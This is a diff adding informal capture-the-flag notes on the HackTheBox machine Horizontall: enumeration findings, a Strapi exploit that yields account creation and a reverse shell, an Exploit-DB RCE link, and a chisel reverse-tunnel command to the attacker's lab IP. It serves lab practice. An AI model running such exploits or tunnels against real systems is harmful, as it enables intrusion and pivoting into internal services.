@@ -1,0 +1,61 @@
+The ip given redirects to http://horizontall.htb/, so this had to be mapped within the hosts file
+
+
+beautified index HTML:
+
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <link rel="icon" href="/favicon.ico">
+    <title>horizontall</title>
+    <link href="/css/app.0f40a091.css" rel="preload" as="style">
+    <link href="/css/chunk-vendors.55204a1e.css" rel="preload" as="style">
+    <link href="/js/app.c68eb462.js" rel="preload" as="script">
+    <link href="/js/chunk-vendors.0e02b89e.js" rel="preload" as="script">
+    <link href="/css/chunk-vendors.55204a1e.css" rel="stylesheet">
+    <link href="/css/app.0f40a091.css" rel="stylesheet">
+  </head>
+  <body>
+    <noscript>
+      <strong>We're sorry but horizontall doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
+    </noscript>
+    <div id="app"></div>
+    <script src="/js/chunk-vendors.0e02b89e.js"></script>
+    <script src="/js/app.c68eb462.js"></script>
+  </body>
+</html>
+
+Note from creator:
+Foothold: When you found that hidden web interface , you better not rush and use All CVE your found on google , first find the VERSION of that dashboard than chain your attack So you can get a Foothold on the machine.
+
+Found this in the source:
+http://api-prod.horizontall.htb/reviews
+
+Nikto found a /admin dir on this sub-domian ^
+
+Google-Fu to get a strapi expliot which created an account for me
+
+
+I think two exploits are needed, something about the json portion isnt making sense, perhaps the first exploit is used to get the jwt token, then this: https://www.exploit-db.com/exploits/50238 is used for RCE?
+
+---------------------
+Yeah fuck this shit, I guess you just need to use the first exploit to request a reverse shell from your machine and pipe it to bash.  I had tried sending these requests to burp to intercept the request thinking that there was something wrong with the request being made but no, I am just going down a rabbit hole.
+
+
+/dev/shm/chisel client 10.10.14.163:8001 R:8000:127.0.0.1:8000
+
+
+
+
+
+
+
+
+
+
+
+
+
